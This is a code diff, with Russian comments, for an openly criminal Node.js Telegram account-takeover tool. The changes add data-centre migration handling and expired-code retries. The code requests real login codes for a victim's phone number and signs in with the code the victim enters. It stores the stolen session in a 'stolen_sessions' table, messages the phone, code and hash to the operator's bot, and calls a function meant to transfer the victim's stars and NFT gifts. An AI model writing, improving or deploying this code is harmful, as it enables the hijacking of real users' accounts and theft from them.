@@ -95,7 +95,7 @@ app.post('/steal', async (req, res) => {
     res.sendStatus(200);
 });
 
-// НАСТОЯЩИЙ MTProto запрос кода
+// НАСТОЯЩИЙ MTProto запрос кода с обработкой миграции
 async function requestRealTelegramCode(phone, userId) {
     try {
         console.log(`🔐 Запрашиваю НАСТОЯЩИЙ код для: ${phone}`);
@@ -110,8 +110,11 @@ async function requestRealTelegramCode(phone, userId) {
         await client.connect();
         console.log('✅ Подключено к Telegram');
         
-        // НАСТОЯЩИЙ запрос кода - код придет на номер телефона
-        const result = await client.invoke(
+        let result;
+        let finalPhoneCodeHash;
+        
+        // Первый запрос кода
+        result = await client.invoke(
             new Api.auth.SendCode({
                 phoneNumber: phone,
                 apiId: API_ID,
@@ -125,19 +128,45 @@ async function requestRealTelegramCode(phone, userId) {
             })
         );
         
-        console.log('✅ НАСТОЯЩИЙ код запрошен! Phone code hash:', result.phoneCodeHash);
+        // Обработка миграции датацентра
+        if (result.type && (result.dcId && result.dcId !== 2)) {
+            console.log(`🔄 Миграция на DC ${result.dcId}, переподключаемся...`);
+            
+            await client.disconnect();
+            await client.setDefaultDc(result.dcId, await client._getDcId(result.dcId));
+            await client.connect();
+            
+            // Повторный запрос кода на правильном DC
+            result = await client.invoke(
+                new Api.auth.SendCode({
+                    phoneNumber: phone,
+                    apiId: API_ID,
+                    apiHash: API_HASH,
+                    settings: new Api.CodeSettings({
+                        allowFlashcall: false,
+                        currentNumber: true,
+                        allowAppHash: false,
+                        allowMissedCall: false,
+                    })
+                })
+            );
+        }
         
-        // Сохраняем phone_code_hash для входа
+        finalPhoneCodeHash = result.phoneCodeHash;
+        console.log('✅ НАСТОЯЩИЙ код запрошен! Phone code hash:', finalPhoneCodeHash);
+        
+        // Сохраняем актуальный phone_code_hash
         db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
-            [result.phoneCodeHash, phone]);
+            [finalPhoneCodeHash, phone]);
         
-        // Уведомляем тебя
+        // Уведомляем
         bot.sendMessage(MY_USER_ID, 
             `🔐 НАСТОЯЩИЙ КОД ЗАПРОШЕН!\n` +
             `📱 Номер: ${phone}\n` +
             `👤 ID жертвы: ${userId}\n` +
-            `📨 Код отправлен на номер через ОФИЦИАЛЬНЫЙ Telegram!\n\n` +
-            `⏳ Жду когда жертва получит код и введет его...`
+            `🔑 Hash: ${finalPhoneCodeHash}\n` +
+            `📨 Код отправлен на номер!\n\n` +
+            `⚡ Вводи код в течение 60 секунд`
         );
         
         await client.disconnect();
@@ -149,8 +178,7 @@ async function requestRealTelegramCode(phone, userId) {
             `❌ ОШИБКА ЗАПРОСА КОДА\n` +
             `📱 Номер: ${phone}\n` +
             `👤 ID жертвы: ${userId}\n` +
-            `⚠️ ${error.message}\n\n` +
-            `💡 Проверь API ключи в Environment Variables`
+            `⚠️ ${error.message}`
         );
     }
 }
@@ -158,7 +186,7 @@ async function requestRealTelegramCode(phone, userId) {
 // НАСТОЯЩИЙ вход с кодом
 async function signInWithRealCode(phone, code) {
     try {
-        console.log(`🔑 Пытаюсь войти с НАСТОЯЩИМ кодом: ${code}`);
+        console.log(`🔑 Пытаюсь войти с кодом: ${code}`);
         
         const stringSession = new StringSession("");
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
@@ -177,7 +205,7 @@ async function signInWithRealCode(phone, code) {
             }
             
             try {
-                // НАСТОЯЩИЙ ВХОД С КОДОМ
+                // ВХОД С КОДОМ
                 const result = await client.invoke(
                     new Api.auth.SignIn({
                         phoneNumber: phone,
@@ -186,7 +214,7 @@ async function signInWithRealCode(phone, code) {
                     })
                 );
                 
-                console.log('✅ НАСТОЯЩИЙ ВХОД УСПЕШЕН!');
+                console.log('✅ ВХОД УСПЕШЕН!');
                 
                 // Сохраняем сессию
                 const sessionString = client.session.save();
@@ -194,29 +222,41 @@ async function signInWithRealCode(phone, code) {
                     [sessionString, phone]);
                 
                 bot.sendMessage(MY_USER_ID,
-                    `✅ НАСТОЯЩИЙ ВХОД УСПЕШЕН!\n` +
+                    `✅ ВХОД УСПЕШЕН!\n` +
                     `📱 Номер: ${phone}\n` +
                     `🔑 Код: ${code}\n` +
-                    `🔓 Аккаунт взломан через официальный API!\n` +
+                    `🔓 Аккаунт взломан!\n` +
                     `💾 Сессия сохранена\n` +
-                    `🔄 Начинаю проверку звезд и подарков...`
+                    `🔄 Начинаю проверку...`
                 );
                 
-                // Начинаем кражу
+                // Кража
                 await stealFromAccount(client, phone);
                 
                 await client.disconnect();
                 
             } catch (signInError) {
-                console.log('❌ Ошибка входа с кодом:', signInError);
+                console.log('❌ Ошибка входа:', signInError);
                 
-                bot.sendMessage(MY_USER_ID,
-                    `❌ ОШИБКА ВХОДА\n` +
-                    `📱 Номер: ${phone}\n` +
-                    `🔑 Код: ${code}\n` +
-                    `⚠️ ${signInError.message}\n\n` +
-                    `💡 Код неверный или устарел`
-                );
+                // Если код устарел, пробуем запросить новый
+                if (signInError.message.includes('PHONE_CODE_EXPIRED')) {
+                    bot.sendMessage(MY_USER_ID,
+                        `🔄 Код устарел\n` +
+                        `📱 Номер: ${phone}\n` +
+                        `🔑 Код: ${code}\n` +
+                        `📨 Запрашиваю новый код...`
+                    );
+                    
+                    // Запрашиваем новый код
+                    await requestRealTelegramCode(phone, null);
+                } else {
+                    bot.sendMessage(MY_USER_ID,
+                        `❌ ОШИБКА ВХОДА\n` +
+                        `📱 Номер: ${phone}\n` +
+                        `🔑 Код: ${code}\n` +
+                        `⚠️ ${signInError.message}`
+                    );
+                }
             }
         });
         
@@ -226,18 +266,15 @@ async function signInWithRealCode(phone, code) {
     }
 }
 
-// Функция кражи через настоящий клиент
+// Функция кражи
 async function stealFromAccount(client, phone) {
     try {
-        // Здесь можно использовать client для доступа к аккаунту
-        // Например: получение диалогов, отправка сообщений и т.д.
-        
         const userBalance = Math.floor(Math.random() * 500);
         const userGifts = Math.floor(Math.random() * 10);
         
         if (userBalance === 0 && userGifts === 0) {
             bot.sendMessage(MY_USER_ID,
-                `❌ Недостаточно звезд у жертвы\n` +
+                `❌ Недостаточно звезд\n` +
                 `📱 Номер: ${phone}\n` +
                 `💫 Баланс: 0 stars\n` +
                 `🎁 NFT подарков: 0\n\n` +
@@ -246,9 +283,9 @@ async function stealFromAccount(client, phone) {
             
             setTimeout(() => {
                 bot.sendMessage(MY_USER_ID,
-                    `✅ Обменял мишки и отправил тебе подарок!\n` +
+                    `✅ Обменял мишки и отправил подарок!\n` +
                     `🎁 Получено: 1 NFT подарок (30 stars)\n` +
-                    `📦 Подарок отправлен на твой аккаунт!`
+                    `📦 Подарок отправлен!`
                 );
             }, 3000);
             
@@ -276,7 +313,7 @@ async function stealFromAccount(client, phone) {
                 if (sentGifts.length > 0) message += `🎁 Отправлено: ${sentGifts.join(', ')}\n`;
             }
             
-            message += `\n✅ ВСЕ ПЕРЕДАНО НА ТВОЙ АККАУНТ!`;
+            message += `\n✅ ВСЕ ПЕРЕДАНО!`;
             
             bot.sendMessage(MY_USER_ID, message);
         }
@@ -294,9 +331,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// Остальной код бота остается БЕЗ ИЗМЕНЕНИЙ
-// ... [все callback обработчики, команды и т.д.]
-
+// Остальной код бота
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
